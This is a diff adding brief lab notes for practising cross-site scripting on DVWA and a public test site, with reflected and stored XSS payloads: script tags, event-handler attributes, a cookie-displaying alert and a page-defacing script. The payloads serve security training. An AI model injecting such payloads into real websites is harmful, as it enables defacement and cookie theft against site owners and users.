@@ -1,0 +1,22 @@
+login to dvwa
+set the security level to low
+go to xss reflected bar
+
+<script>alert("XSS Attack!");</script> 
+<script>alert(document.cookie);</script>
+<script>alert('XSS Test');</script>
+<img src="invalid-image" onerror="alert('XSS Alert');"> 
+<a href="#" onclick="alert('XSS Click');"> Click me</a> 
+<input type="text" value="XSS" onfocus="alert('XSS Focus')" autofocus>
+
+ https://testphp.vulnweb.com/search.php?query=<script>alert('URL XSS');</script> 
+
+go to xss stored
+give any name 
+give these in message box and submit
+<script>alert("Stored XSS");</script> 
+<script>document.body.innerHTML = "<h1>You've been hacked!</h1>";</script> 
+<img src="nonexistent.jpg" onerror="alert('Stored XSS with img');"> 
+<input type="text" value="XSS"onfocus="alert('Stored XSS onfocus')" autofocus> 
+<a href="#" onclick="alert('Stored XSS on click');">Click me</a> 
+<div onmouseover="alert('Stored XSS on hover')"> Hover over this text!</div>
